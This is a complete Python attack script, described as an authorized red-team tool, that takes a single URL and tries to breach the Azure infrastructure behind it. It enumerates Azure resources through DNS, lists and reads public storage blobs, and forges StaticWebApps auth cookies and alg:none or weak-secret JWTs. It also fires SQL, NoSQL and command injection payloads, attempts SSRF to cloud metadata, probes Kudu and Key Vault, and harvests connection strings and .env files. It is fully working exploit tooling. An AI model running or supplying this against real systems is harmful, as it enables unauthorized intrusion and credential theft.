#!/usr/bin/env python3
"""
Azure infrastructure breach attempt — zero-knowledge red team.

Starting with ONLY a URL, discover the Azure footprint and try every
angle to gain unauthorized access: storage enumeration, SWA auth bypass,
API function exploitation, managed identity abuse, misconfigured RBAC,
exposed connection strings, and more.

Authorized target only.
"""
from __future__ import annotations

import base64
import hashlib
import json
import re
import socket
import ssl
import struct
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
TIMEOUT = 10


class AzureBreachReport:
    def __init__(self, target: str):
        self.target = target
        self.findings: list[dict] = []
        self.attempts: list[dict] = []
        self.discovered: dict = {}  # Azure resource discovery
        self.start = datetime.now(timezone.utc)
        self.spa_hash: str | None = None

    def fingerprint_spa(self):
        """Fetch a nonexistent path to fingerprint the SPA fallback page."""
        canary = self.target.rstrip("/") + "/nonexistent-" + hashlib.sha256(b"az-fp").hexdigest()[:10]
        s, _, b, _ = req(canary)
        if s == 200 and b:
            body_bytes = b.encode() if isinstance(b, str) else b
            self.spa_hash = hashlib.sha256(body_bytes).hexdigest()
            print(f"  SPA fallback: {len(b)} bytes (hash {self.spa_hash[:12]}...)")

    def is_spa_fallback(self, body: str) -> bool:
        if not self.spa_hash:
            return False
        body_bytes = body.encode() if isinstance(body, str) else body
        return hashlib.sha256(body_bytes).hexdigest() == self.spa_hash

    def attempt(self, phase: str, technique: str, detail: str, result: str,
                success: bool = False, severity: str = "info"):
        entry = {
            "phase": phase,
            "technique": technique,
            "detail": detail,
            "result": result,
            "success": success,
            "severity": severity,
            "time": datetime.now(timezone.utc).isoformat(),
        }
        self.attempts.append(entry)
        mark = "BREACH" if success else "blocked"
        icon = ">>>" if success else "   "
        sev = f" [{severity.upper()}]" if success else ""
        print(f"  {icon} [{mark}]{sev} {technique}: {result[:130]}")
        if success:
            self.findings.append(entry)

    def save(self, path: str):
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            json.dump({
                "target": self.target,
                "start": self.start.isoformat(),
                "end": datetime.now(timezone.utc).isoformat(),
                "total_attempts": len(self.attempts),
                "breaches": len(self.findings),
                "discovered_resources": self.discovered,
                "findings": self.findings,
                "all_attempts": self.attempts,
            }, f, indent=2)


def req(url, method="GET", headers=None, data=None, follow=True, timeout=TIMEOUT):
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    try:
        if isinstance(data, str):
            data = data.encode()
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        ctx = ssl.create_default_context()
        if not follow:
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a):
                    raise urllib.error.HTTPError(a[5], a[2], a[3], a[4], a[1]) if len(a) > 5 else None
            opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
        else:
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        resp = opener.open(r, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body, resp.url
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, dict(e.headers) if hasattr(e, "headers") else {}, body, url
    except Exception as e:
        return 0, {}, str(e), url


# ============================================================
# PHASE 1: AZURE RESOURCE DISCOVERY (from URL alone)
# ============================================================

def phase_discover(rpt: AzureBreachReport):
    print("\n[PHASE 1] AZURE RESOURCE DISCOVERY — starting from zero knowledge")
    base = rpt.target.rstrip("/")
    hostname = urllib.parse.urlparse(base).hostname
    domain = ".".join(hostname.split(".")[-2:])
    name_stem = hostname.split(".")[0].replace("-", "").replace(".", "")

    # 1a. DNS enumeration for Azure services
    print("  --- DNS enumeration for Azure resources ---")
    azure_suffixes = [
        (".blob.core.windows.net", "Azure Blob Storage"),
        (".file.core.windows.net", "Azure File Storage"),
        (".queue.core.windows.net", "Azure Queue Storage"),
        (".table.core.windows.net", "Azure Table Storage"),
        (".dfs.core.windows.net", "Azure Data Lake"),
        (".database.windows.net", "Azure SQL Database"),
        (".azurewebsites.net", "Azure App Service"),
        (".azurestaticapps.net", "Azure Static Web Apps"),
        (".scm.azurewebsites.net", "Azure Kudu (SCM)"),
        (".azurefd.net", "Azure Front Door"),
        (".azureedge.net", "Azure CDN"),
        (".vault.azure.net", "Azure Key Vault"),
        (".redis.cache.windows.net", "Azure Redis Cache"),
        (".servicebus.windows.net", "Azure Service Bus"),
        (".documents.azure.com", "Azure Cosmos DB"),
        (".search.windows.net", "Azure Cognitive Search"),
        (".cognitiveservices.azure.com", "Azure Cognitive Services"),
        (".azurecr.io", "Azure Container Registry"),
        (".azurecontainerapps.io", "Azure Container Apps"),
        (".signalr.net", "Azure SignalR"),
        (".webpubsub.azure.com", "Azure Web PubSub"),
    ]

    # Generate candidate names from the domain
    candidates = set()
    parts = hostname.replace(".", "-").replace("www-", "").split("-")
    candidates.add(name_stem)
    candidates.add(hostname.replace(".", ""))
    candidates.add(domain.replace(".", ""))
    for p in parts:
        if len(p) > 2:
            candidates.add(p)
    # Common Azure naming patterns
    for base_name in list(candidates):
        candidates.add(f"swa-{base_name}")
        candidates.add(f"st{base_name}")
        candidates.add(f"{base_name}storage")
        candidates.add(f"{base_name}api")
        candidates.add(f"{base_name}app")
        candidates.add(f"{base_name}db")
        candidates.add(f"{base_name}kv")
        candidates.add(f"{base_name}func")
        candidates.add(f"{base_name}prod")
        candidates.add(f"{base_name}dev")
        candidates.add(f"{base_name}staging")

    discovered = {}
    for cand in sorted(candidates):
        for suffix, service in azure_suffixes:
            fqdn = cand + suffix
            try:
                ip = socket.gethostbyname(fqdn)
                discovered[fqdn] = {"service": service, "ip": ip}
                rpt.attempt("discover", "dns_enum", f"Checking {fqdn}",
                             f"RESOLVED: {fqdn} -> {ip} ({service})",
                             success=True, severity="medium")
            except socket.gaierror:
                pass

    rpt.discovered = discovered
    print(f"  Found {len(discovered)} Azure resources")
    return discovered


# ============================================================
# PHASE 2: STORAGE ACCOUNT EXPLOITATION
# ============================================================

def phase_storage(rpt: AzureBreachReport, discovered: dict):
    print("\n[PHASE 2] AZURE STORAGE EXPLOITATION")

    blob_accounts = [h for h, d in discovered.items() if "blob.core.windows.net" in h]

    if not blob_accounts:
        # Try common names anyway
        base = rpt.target.rstrip("/")
        hostname = urllib.parse.urlparse(base).hostname
        stem = hostname.split(".")[0].replace("-", "").replace(".", "")
        blob_accounts = [
            f"{stem}.blob.core.windows.net",
            f"st{stem}.blob.core.windows.net",
            f"{stem}storage.blob.core.windows.net",
        ]

    for account in blob_accounts:
        account_name = account.split(".")[0]
        base_url = f"https://{account}"

        # 2a. Anonymous container enumeration
        print(f"  --- Probing storage account: {account_name} ---")
        common_containers = [
            "$web", "$logs", "$root", "public", "uploads", "images",
            "assets", "static", "data", "backup", "backups",
            "files", "documents", "media", "content", "cdn",
            "deploy", "deployment", "releases", "builds",
            "logs", "audit", "reports", "exports",
            "config", "configuration", "secrets",
            "dev", "staging", "prod", "test",
        ]

        for container in common_containers:
            # List blobs (anonymous access)
            list_url = f"{base_url}/{container}?restype=container&comp=list"
            s, h, b, _ = req(list_url, timeout=5)

            if s == 200 and "<Blob>" in b:
                blob_names = re.findall(r'<Name>([^<]+)</Name>', b)
                rpt.attempt("storage", "container_enum",
                             f"{account_name}/{container}",
                             f"PUBLIC CONTAINER with {len(blob_names)} blobs: {', '.join(blob_names[:5])}",
                             success=True, severity="critical")

                # Try to read sensitive blobs
                for blob in blob_names[:10]:
                    if any(x in blob.lower() for x in [".env", "config", "secret", "key",
                                                        "password", "credential", "token",
                                                        ".json", ".yaml", ".yml", "backup",
                                                        ".sql", ".db", ".bak"]):
                        blob_url = f"{base_url}/{container}/{blob}"
                        bs, bh, bb, _ = req(blob_url, timeout=5)
                        if bs == 200:
                            rpt.attempt("storage", "blob_read",
                                         f"{account_name}/{container}/{blob}",
                                         f"READ SENSITIVE BLOB ({len(bb)} bytes): {bb[:200]}",
                                         success=True, severity="critical")

            elif s == 200 and "BlobNotFound" not in b:
                rpt.attempt("storage", "container_enum",
                             f"{account_name}/{container}",
                             f"Container exists but listing denied (s={s})")

        # 2b. SAS token in URL history (check if site leaks any)
        s, _, body, _ = req(rpt.target)
        sas_tokens = re.findall(r'(?:sv=|se=|sig=|sp=|sr=)[^\s"\'&]+', body)
        if sas_tokens:
            rpt.attempt("storage", "sas_leak",
                         "SAS token in page source",
                         f"Found SAS parameters: {sas_tokens[0][:60]}",
                         success=True, severity="critical")


# ============================================================
# PHASE 3: SWA AUTH BYPASS ATTEMPTS
# ============================================================

def phase_swa_auth(rpt: AzureBreachReport):
    print("\n[PHASE 3] SWA AUTHENTICATION BYPASS")
    base = rpt.target.rstrip("/")

    # 3a. Auth cookie forgery
    print("  --- Auth cookie manipulation ---")
    # SWA uses a StaticWebAppsAuthCookie
    fake_principals = [
        # Try admin claim
        base64.b64encode(json.dumps({
            "identityProvider": "aad",
            "userId": "admin",
            "userDetails": "admin@admin.com",
            "userRoles": ["admin", "authenticated", "anonymous"],
            "claims": [{"typ": "name", "val": "Admin"}]
        }).encode()).decode(),
        # Try authenticated claim
        base64.b64encode(json.dumps({
            "identityProvider": "github",
            "userId": "attacker",
            "userDetails": "attacker@evil.com",
            "userRoles": ["authenticated", "anonymous"],
        }).encode()).decode(),
    ]

    for i, principal in enumerate(fake_principals):
        cookies = {"StaticWebAppsAuthCookie": principal}
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        # Try accessing auth-gated resources
        for path in ["/.auth/me", "/api/", "/api/admin", "/admin", "/dashboard"]:
            s, h, b, _ = req(base + path, headers={"Cookie": cookie_str})
            # clientPrincipal: null is normal for unauthenticated users;
            # only flag when the principal is non-null (actual bypass)
            has_principal = "clientPrincipal" in b and '"clientPrincipal":null' not in b.replace(" ", "") and '"clientPrincipal": null' not in b
            if s == 200 and has_principal:
                rpt.attempt("swa_auth", "cookie_forgery",
                             f"Forged cookie #{i+1} on {path}",
                             f"Auth bypass! Got clientPrincipal: {b[:200]}",
                             success=True, severity="critical")
            elif s == 200 and path.startswith("/api") and "<!doctype" not in b.lower()[:50]:
                rpt.attempt("swa_auth", "cookie_forgery",
                             f"Forged cookie #{i+1} on {path}",
                             f"API responded with forged cookie: {b[:200]}",
                             success=True, severity="high")
            else:
                rpt.attempt("swa_auth", "cookie_forgery",
                             f"Forged cookie #{i+1} on {path}",
                             f"Rejected (status {s})")

    # 3b. Role manipulation via headers
    print("  --- Role injection via headers ---")
    role_headers = [
        {"X-MS-CLIENT-PRINCIPAL-NAME": "admin@admin.com"},
        {"X-MS-CLIENT-PRINCIPAL-ID": "00000000-0000-0000-0000-000000000000"},
        {"X-MS-CLIENT-PRINCIPAL-IDP": "aad"},
        {"X-MS-TOKEN-AAD-ID-TOKEN": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbImFkbWluIl19."},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Original-Host": "localhost"},
    ]
    for hdrs in role_headers:
        key = list(hdrs.keys())[0]
        for path in ["/api/", "/.auth/me", "/admin"]:
            s, h, b, _ = req(base + path, headers=hdrs)
            if s == 200 and not rpt.is_spa_fallback(b) and "<!doctype" not in b.lower()[:50] and len(b) > 20:
                rpt.attempt("swa_auth", "header_injection",
                             f"{key} on {path}",
                             f"Response: {s} ({len(b)} bytes) -> {b[:150]}",
                             success=True, severity="high")

    # 3c. Route config bypass
    print("  --- Route restriction bypass ---")
    bypass_patterns = [
        "/api/../admin",
        "/api/..%2fadmin",
        "/api/..%252fadmin",
        "/API/admin",  # Case sensitivity
        "/api%00/admin",
        "/api;/admin",
        "/api/admin%20",
        "/api/admin/.",
        "/api/admin..%00",
    ]
    for path in bypass_patterns:
        s, h, b, _ = req(base + path)
        if s == 200 and not rpt.is_spa_fallback(b) and "<!doctype" not in b.lower()[:50]:
            rpt.attempt("swa_auth", "route_bypass",
                         f"Path traversal: {path}",
                         f"Bypass successful! Status {s}: {b[:150]}",
                         success=True, severity="critical")


# ============================================================
# PHASE 4: AZURE API FUNCTION EXPLOITATION
# ============================================================

def phase_api_exploit(rpt: AzureBreachReport):
    print("\n[PHASE 4] API FUNCTION EXPLOITATION")
    base = rpt.target.rstrip("/")

    # 4a. Function discovery and fuzzing
    print("  --- API function discovery ---")
    api_paths = [
        "/api/health", "/api/status", "/api/version",
        "/api/config", "/api/settings", "/api/env",
        "/api/users", "/api/user/me", "/api/user/1",
        "/api/admin", "/api/admin/users",
        "/api/data", "/api/export", "/api/import",
        "/api/upload", "/api/files", "/api/file",
        "/api/webhook", "/api/callback",
        "/api/auth", "/api/login", "/api/register",
        "/api/token", "/api/refresh",
        "/api/graphql", "/api/query",
        "/api/debug", "/api/trace", "/api/logs",
        "/api/internal", "/api/private",
        "/api/test", "/api/ping", "/api/echo",
        "/api/swagger", "/api/docs",
        "/api/negotiate",  # SignalR
        "/api/pubsub", "/api/ws",  # WebSocket/PubSub
    ]

    live_apis = []
    for path in api_paths:
        s, h, b, _ = req(base + path)
        if s not in (404, 0) and not rpt.is_spa_fallback(b) and "<!doctype" not in b.lower()[:100]:
            live_apis.append((path, s, b))
            is_sensitive = any(x in path for x in ["/admin", "/debug", "/env", "/config",
                                                    "/internal", "/private", "/export", "/logs"])
            rpt.attempt("api_exploit", "function_discovery", path,
                         f"LIVE API: {s} ({len(b)} bytes) — {b[:150]}",
                         success=is_sensitive and s == 200,
                         severity="high" if is_sensitive else "low")

    # 4b. Injection attacks on live APIs
    print("  --- API injection attacks ---")
    for path, orig_status, orig_body in live_apis:
        # SQL injection
        for payload in ["' OR 1=1--", "1; DROP TABLE users--", "' UNION SELECT null--"]:
            s, h, b, _ = req(base + path + f"?id={urllib.parse.quote(payload)}")
            if s == 500 or any(x in b.lower() for x in ["sql", "syntax", "mysql", "postgres", "sqlite"]):
                rpt.attempt("api_exploit", "sql_injection", f"{path}?id={payload}",
                             f"SQL error triggered: {b[:200]}",
                             success=True, severity="critical")

        # NoSQL injection
        for payload in ['{"$gt":""}', '{"$ne":null}', '[$ne]=null']:
            s, h, b, _ = req(base + path + f"?id={urllib.parse.quote(payload)}")
            if s == 200 and len(b) > len(orig_body) * 1.5:
                rpt.attempt("api_exploit", "nosql_injection", f"{path}?id={payload}",
                             f"Possible NoSQL injection: response grew from {len(orig_body)} to {len(b)}",
                             success=True, severity="high")

        # Command injection
        for payload in ["; ls", "| cat /etc/passwd", "`id`", "$(whoami)"]:
            s, h, b, _ = req(base + path, method="POST",
                              headers={"Content-Type": "application/json"},
                              data=json.dumps({"input": payload}))
            if any(x in b for x in ["root:", "uid=", "www-data"]):
                rpt.attempt("api_exploit", "command_injection", f"POST {path}",
                             f"COMMAND EXECUTION! {b[:200]}",
                             success=True, severity="critical")

        # SSRF via API
        for ssrf_url in ["http://169.254.169.254/latest/meta-data/",
                          "http://100.100.100.200/latest/meta-data/",
                          "http://metadata.google.internal/computeMetadata/v1/"]:
            s, h, b, _ = req(base + path, method="POST",
                              headers={"Content-Type": "application/json"},
                              data=json.dumps({"url": ssrf_url}))
            if any(x in b for x in ["ami-id", "instance-id", "iam", "computeMetadata"]):
                rpt.attempt("api_exploit", "ssrf_cloud_metadata", f"POST {path}",
                             f"CLOUD METADATA ACCESS! {b[:200]}",
                             success=True, severity="critical")

    # 4c. SignalR / Web PubSub exploitation
    print("  --- Real-time service exploitation ---")
    negotiate_paths = ["/api/negotiate", "/negotiate", "/api/ws/negotiate"]
    for path in negotiate_paths:
        s, h, b, _ = req(base + path, method="POST",
                          headers={"Content-Type": "application/json"},
                          data='{}')
        if s == 200 and ("url" in b or "accessToken" in b or "connectionId" in b):
            rpt.attempt("api_exploit", "signalr_negotiate", path,
                         f"SignalR/PubSub negotiation exposed: {b[:200]}",
                         success=True, severity="high")

            # Try to extract the access token
            try:
                data = json.loads(b)
                if "accessToken" in data:
                    rpt.attempt("api_exploit", "pubsub_token", path,
                                 f"WebSocket access token leaked: {str(data['accessToken'])[:40]}...",
                                 success=True, severity="critical")
                if "url" in data:
                    rpt.attempt("api_exploit", "pubsub_url", path,
                                 f"WebSocket URL leaked: {data['url'][:100]}",
                                 success=True, severity="high")
            except json.JSONDecodeError:
                pass


# ============================================================
# PHASE 5: AZURE MANAGEMENT PLANE RECON
# ============================================================

def phase_mgmt_plane(rpt: AzureBreachReport, discovered: dict):
    print("\n[PHASE 5] AZURE MANAGEMENT PLANE RECONNAISSANCE")

    # 5a. Kudu/SCM access check
    print("  --- Kudu/SCM access ---")
    scm_hosts = [h for h in discovered if ".scm." in h]
    base = rpt.target.rstrip("/")
    hostname = urllib.parse.urlparse(base).hostname

    # Also try to guess SCM URL
    stem = hostname.split(".")[0].replace("-", "")
    scm_candidates = [
        f"https://{stem}.scm.azurewebsites.net",
        f"https://swa-{stem}.scm.azurewebsites.net",
    ]

    for scm_url in scm_candidates:
        for path in ["/", "/env", "/api/vfs/", "/api/processes",
                     "/api/deployments", "/api/settings", "/basicauth"]:
            s, h, b, _ = req(scm_url + path, timeout=5)
            if s == 200 and len(b) > 50:
                rpt.attempt("mgmt_plane", "kudu_access", f"{scm_url}{path}",
                             f"Kudu SCM accessible: {b[:200]}",
                             success=True, severity="critical")
            elif s == 401:
                rpt.attempt("mgmt_plane", "kudu_access", f"{scm_url}{path}",
                             f"Kudu exists but requires auth (401)")

    # 5b. Key Vault discovery
    print("  --- Key Vault probing ---")
    kv_hosts = [h for h in discovered if "vault.azure.net" in h]
    for kv in kv_hosts:
        for endpoint in ["/secrets?api-version=7.4", "/keys?api-version=7.4",
                          "/certificates?api-version=7.4"]:
            kv_url = f"https://{kv}{endpoint}"
            s, h, b, _ = req(kv_url, timeout=5)
            if s == 200:
                rpt.attempt("mgmt_plane", "keyvault_access", kv_url,
                             f"KEY VAULT DATA EXPOSED: {b[:200]}",
                             success=True, severity="critical")
            elif s == 401:
                rpt.attempt("mgmt_plane", "keyvault_access", kv_url,
                             f"Key Vault exists, auth required")

    # 5c. Azure AD tenant discovery
    print("  --- Azure AD tenant discovery ---")
    domain = ".".join(hostname.split(".")[-2:])
    openid_url = f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"
    s, h, b, _ = req(openid_url, timeout=5)
    if s == 200 and "token_endpoint" in b:
        try:
            data = json.loads(b)
            tenant_id = data.get("token_endpoint", "").split("/")[3]
            rpt.attempt("mgmt_plane", "tenant_discovery", domain,
                         f"Azure AD tenant found: {tenant_id}",
                         success=True, severity="low")
            rpt.discovered["azure_tenant_id"] = tenant_id
        except Exception:
            pass

    # 5d. Cosmos DB endpoint probing
    print("  --- Cosmos DB probing ---")
    cosmos_hosts = [h for h in discovered if "documents.azure.com" in h]
    for cosmos in cosmos_hosts:
        s, h, b, _ = req(f"https://{cosmos}/", timeout=5)
        if s == 401 and "unauthorized" in b.lower():
            rpt.attempt("mgmt_plane", "cosmosdb_exists", cosmos,
                         "Cosmos DB endpoint exists (401)")
        elif s == 200:
            rpt.attempt("mgmt_plane", "cosmosdb_open", cosmos,
                         f"COSMOS DB OPEN: {b[:200]}",
                         success=True, severity="critical")


# ============================================================
# PHASE 6: CREDENTIAL HARVESTING FROM PUBLIC SOURCES
# ============================================================

def phase_credential_harvest(rpt: AzureBreachReport):
    print("\n[PHASE 6] CREDENTIAL HARVESTING ATTEMPT")
    base = rpt.target.rstrip("/")
    hostname = urllib.parse.urlparse(base).hostname

    # 6a. Check all JS bundles for Azure connection strings
    print("  --- Azure connection strings in bundles ---")
    s, h, body, _ = req(base + "/")
    js_files = re.findall(r'(?:src|href)=["\']([^"\']*\.(?:js|mjs))["\']', body)

    azure_patterns = [
        (r'DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[^;"\']+', "Storage Connection String"),
        (r'Server=tcp:[^;]+;.*?Password=[^;"\']+', "SQL Connection String"),
        (r'mongodb(?:\+srv)?://[^"\'<>\s]+', "MongoDB Connection String"),
        (r'AccountEndpoint=https://[^;]+;AccountKey=[^;"\']+', "Cosmos DB Connection String"),
        (r'Endpoint=sb://[^;]+;SharedAccessKey[^;"\']+', "Service Bus Connection String"),
        (r'wss?://[^"\'<>\s]*\.webpubsub\.azure\.com[^"\'<>\s]*', "Web PubSub URL"),
        (r'https://[^"\'<>\s]*\.vault\.azure\.net[^"\'<>\s]*', "Key Vault URL"),
        (r'InstrumentationKey=[0-9a-f-]{36}', "App Insights Instrumentation Key"),
        (r'https://[^"\'<>\s]*\.applicationinsights\.azure\.com[^"\'<>\s]*', "App Insights Endpoint"),
        (r'Endpoint=https://[^;]+\.communication\.azure\.com[^;"\']*', "Communication Services"),
    ]

    for jf in js_files[:15]:
        url = jf if jf.startswith("http") else base + (jf if jf.startswith("/") else "/" + jf)
        s, _, jb, _ = req(url)
        if s != 200:
            continue

        for pattern, label in azure_patterns:
            matches = re.findall(pattern, jb)
            for match in matches[:2]:
                rpt.attempt("cred_harvest", "bundle_azure_cred", f"{label} in JS",
                             f"CREDENTIAL FOUND: {match[:60]}...",
                             success=True, severity="critical")

    # 6b. Check for leaked SAS tokens in page content
    print("  --- SAS token hunting ---")
    sas_patterns = [
        r'[?&]sv=\d{4}-\d{2}-\d{2}[^"\'<>\s]*sig=[^"\'<>\s]+',
        r'SharedAccessSignature=[^"\'<>\s]+',
    ]
    for pattern in sas_patterns:
        matches = re.findall(pattern, body)
        for match in matches:
            rpt.attempt("cred_harvest", "sas_token", "Page source",
                         f"SAS TOKEN FOUND: ...{match[:60]}...",
                         success=True, severity="critical")

    # 6c. Check well-known development files
    print("  --- Development file exposure ---")
    dev_files = [
        "/.env", "/.env.local", "/.env.production", "/.env.development",
        "/appsettings.json", "/appsettings.Development.json",
        "/web.config", "/applicationhost.config",
        "/local.settings.json", "/host.json",
        "/.vscode/settings.json", "/.vscode/launch.json",
        "/terraform.tfstate", "/terraform.tfvars",
        "/.azure/config", "/azure-pipelines.yml",
        "/bicepconfig.json",
    ]
    for path in dev_files:
        s, h, b, _ = req(base + path)
        if s == 200 and len(b) > 20 and "<!doctype" not in b.lower()[:100]:
            has_secrets = any(x in b.lower() for x in [
                "password", "secret", "key", "token", "connectionstring",
                "accountkey", "accesskey", "apikey"
            ])
            rpt.attempt("cred_harvest", "dev_file", path,
                         f"DEV FILE EXPOSED ({len(b)} bytes, secrets: {has_secrets}): {b[:200]}",
                         success=True, severity="critical" if has_secrets else "high")


# ============================================================
# PHASE 7: BUSINESS LOGIC ATTACKS
# ============================================================

def phase_business_logic(rpt: AzureBreachReport):
    print("\n[PHASE 7] BUSINESS LOGIC ATTACKS")
    base = rpt.target.rstrip("/")

    # 7a. Race condition on API endpoints
    print("  --- Race condition probing ---")
    # Find POST endpoints
    s, h, body, _ = req(base + "/")
    form_actions = re.findall(r'action=["\']([^"\']+)["\']', body)
    api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)

    # 7b. Parameter manipulation
    print("  --- Parameter pollution ---")
    for path in api_patterns[:5]:
        url = base + path
        # Try adding admin parameters
        for param in ["admin=true", "role=admin", "isAdmin=1", "debug=1",
                       "internal=true", "bypass=true", "test=true"]:
            sep = "&" if "?" in path else "?"
            s, h, b, _ = req(url + sep + param)
            if s == 200 and "<!doctype" not in b.lower()[:50]:
                rpt.attempt("business_logic", "param_pollution", f"{path}?{param}",
                             f"API accepted param: status {s}, body: {b[:100]}",
                             success=False)

    # 7c. JWT none-algorithm attack
    print("  --- JWT manipulation ---")
    # Forge a JWT with alg:none
    jwt_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    jwt_payload = base64.urlsafe_b64encode(json.dumps({
        "sub": "admin",
        "aud": urllib.parse.urlparse(base).hostname,
        "iss": "attacker",
        "exp": int(time.time()) + 3600,
        "roles": ["admin", "authenticated"],
        "name": "Admin",
        "email": "admin@admin.com"
    }).encode()).decode().rstrip("=")
    forged_jwt = f"{jwt_header}.{jwt_payload}."

    for path in ["/api/", "/.auth/me", "/api/admin", "/api/user/me"]:
        s, h, b, _ = req(base + path, headers={"Authorization": f"Bearer {forged_jwt}"})
        if s == 200 and "<!doctype" not in b.lower()[:50] and len(b) > 20:
            rpt.attempt("business_logic", "jwt_none_attack", path,
                         f"JWT none-alg accepted: {b[:200]}",
                         success=True, severity="critical")

    # Try with common secret signatures
    for path in ["/api/", "/api/admin"]:
        for secret in ["secret", "password", "jwt_secret", "changeme", ""]:
            import hmac
            jwt_h = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
            jwt_p = base64.urlsafe_b64encode(json.dumps({
                "sub": "admin", "roles": ["admin"], "exp": int(time.time()) + 3600
            }).encode()).decode().rstrip("=")
            msg = f"{jwt_h}.{jwt_p}".encode()
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            ).decode().rstrip("=")
            forged = f"{jwt_h}.{jwt_p}.{sig}"

            s, _, b, _ = req(base + path, headers={"Authorization": f"Bearer {forged}"})
            if s == 200 and "<!doctype" not in b.lower()[:50] and len(b) > 20:
                rpt.attempt("business_logic", "jwt_weak_secret", f"{path} (secret='{secret}')",
                             f"JWT accepted with weak secret: {b[:200]}",
                             success=True, severity="critical")


# ============================================================
# MAIN
# ============================================================

def run_azure_breach(target: str, output_dir: str):
    rpt = AzureBreachReport(target)

    print(f"\n{'='*70}")
    print(f" AZURE ZERO-KNOWLEDGE BREACH ATTEMPT")
    print(f" Target: {target}")
    print(f" Started: {rpt.start.isoformat()}")
    print(f" Note: Starting with ZERO prior knowledge.")
    print(f"{'='*70}")

    rpt.fingerprint_spa()
    discovered = phase_discover(rpt)
    phase_storage(rpt, discovered)
    phase_swa_auth(rpt)
    phase_api_exploit(rpt)
    phase_mgmt_plane(rpt, discovered)
    phase_credential_harvest(rpt)
    phase_business_logic(rpt)

    # Final summary
    print(f"\n{'='*70}")
    print(f" AZURE BREACH ATTEMPT COMPLETE")
    print(f"{'='*70}")
    print(f" Target: {target}")
    print(f" Total attempts: {len(rpt.attempts)}")
    print(f" Azure resources discovered: {len(rpt.discovered)}")
    print(f" Breaches: {len(rpt.findings)}")

    if rpt.findings:
        print(f"\n BREACH CHAIN:")
        by_phase = {}
        for f in rpt.findings:
            by_phase.setdefault(f["phase"], []).append(f)
        for phase, findings in by_phase.items():
            print(f"\n   {phase.upper()}:")
            for f in findings:
                print(f"     [{f['severity'].upper()}] {f['technique']}: {f['result'][:90]}")
    else:
        print(f"\n ZERO BREACHES — Azure infrastructure is locked down.")

    out_path = f"{output_dir}/azure-breach.json"
    rpt.save(out_path)
    print(f"\n Full report: {out_path}")
    return rpt


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python azure_breach.py <target_url> [output_dir]")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else "./azure-breach-results"
    run_azure_breach(target, output)
